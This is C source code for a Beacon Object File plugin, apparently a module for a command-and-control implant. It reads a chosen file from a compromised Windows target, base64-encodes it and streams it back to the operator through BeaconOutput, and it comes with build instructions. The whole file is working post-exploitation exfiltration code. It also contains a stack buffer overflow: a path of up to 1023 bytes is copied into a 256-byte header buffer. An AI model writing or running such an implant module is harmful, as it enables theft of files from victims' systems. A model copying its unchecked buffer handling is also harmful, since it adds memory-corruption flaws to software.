/*
 * file_download.c - File download BOF plugin.
 *
 * Reads a file from the target machine, base64 encodes it,
 * and sends the encoded content back through BeaconOutput.
 * Base64 ensures all output is pure ASCII — no binary corruption
 * from UTF-8 lossy conversion in the Rust BOF runner.
 *
 * Output format:
 *   Line 1:     === FILE: <path> ===
 *   Remaining:  base64-encoded file content (no newlines)
 *
 * Max file size: 10 MB
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c file_download.c -o file_download.o
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);

static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*
 * Base64 encode `in_len` bytes from `in` into `out`.
 * Returns the number of output characters written.
 * Caller must ensure `out` has at least ((in_len+2)/3)*4 bytes.
 */
static int b64_encode(const unsigned char* in, int in_len, char* out) {
    int i, j = 0;
    for (i = 0; i + 2 < in_len; i += 3) {
        out[j++] = b64_table[(in[i] >> 2) & 0x3F];
        out[j++] = b64_table[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
        out[j++] = b64_table[((in[i+1] & 0xF) << 2) | ((in[i+2] >> 6) & 0x3)];
        out[j++] = b64_table[in[i+2] & 0x3F];
    }
    if (i < in_len) {
        out[j++] = b64_table[(in[i] >> 2) & 0x3F];
        if (i + 1 < in_len) {
            out[j++] = b64_table[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
            out[j++] = b64_table[((in[i+1] & 0xF) << 2)];
        } else {
            out[j++] = b64_table[((in[i] & 0x3) << 4)];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    return j;
}

#define MAX_FILE_SIZE (10 * 1024 * 1024)  /* 10 MB */
#define READ_CHUNK    3072                 /* 3072 bytes -> exactly 4096 base64 chars */

void go(char* args, int alen)
{
    char* file_path = NULL;
    int file_path_len = 0;
    unsigned char raw_buf[READ_CHUNK];
    char b64_buf[4100];   /* 4096 base64 chars + margin */
    DWORD bytesRead;

    /* Parse file path from args */
    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        file_path = BeaconDataExtract(&parser, &file_path_len);
    }

    if (file_path == NULL || file_path_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No file path provided\n", 22);
        return;
    }

    /* Null-terminate the path */
    char path_buf[1024];
    if (file_path_len >= (int)sizeof(path_buf)) {
        BeaconOutput(CALLBACK_ERROR, "Path too long\n", 14);
        return;
    }
    bof_memcpy(path_buf, file_path, file_path_len);
    path_buf[file_path_len] = '\0';

    /* Open file for reading */
    HANDLE hFile = KERNEL32$CreateFileA(
        path_buf,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconOutput(CALLBACK_ERROR, "Failed to open file\n", 20);
        return;
    }

    /* Check file size — reject files > 10 MB to prevent agent OOM */
    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > MAX_FILE_SIZE) {
        KERNEL32$CloseHandle(hFile);
        BeaconOutput(CALLBACK_ERROR, "File too large (max 10MB)\n", 25);
        return;
    }

    /* Output header line */
    char header[256];
    int hlen = 0;
    const char* p1 = "=== FILE: ";
    int p1len = bof_strlen(p1);
    bof_memcpy(header + hlen, p1, p1len); hlen += p1len;
    bof_memcpy(header + hlen, path_buf, file_path_len); hlen += file_path_len;
    const char* p2 = " ===\n";
    int p2len = bof_strlen(p2);
    bof_memcpy(header + hlen, p2, p2len); hlen += p2len;
    BeaconOutput(CALLBACK_OUTPUT, header, hlen);

    /*
     * Read file in fixed chunks, base64 encode each chunk, then output.
     *
     * READ_CHUNK = 3072, which is divisible by 3. This means every full
     * chunk produces exactly 4096 base64 chars with no padding. Only the
     * last (possibly partial) chunk gets '=' padding. Concatenating all
     * chunks yields valid contiguous base64.
     *
     * Each BeaconOutput call sends pure ASCII text, so the Rust
     * String::from_utf8_lossy conversion is lossless.
     */
    while (KERNEL32$ReadFile(hFile, raw_buf, READ_CHUNK, &bytesRead, NULL) && bytesRead > 0) {
        int b64_len = b64_encode(raw_buf, (int)bytesRead, b64_buf);
        BeaconOutput(CALLBACK_OUTPUT, b64_buf, b64_len);
    }

    KERNEL32$CloseHandle(hFile);
}
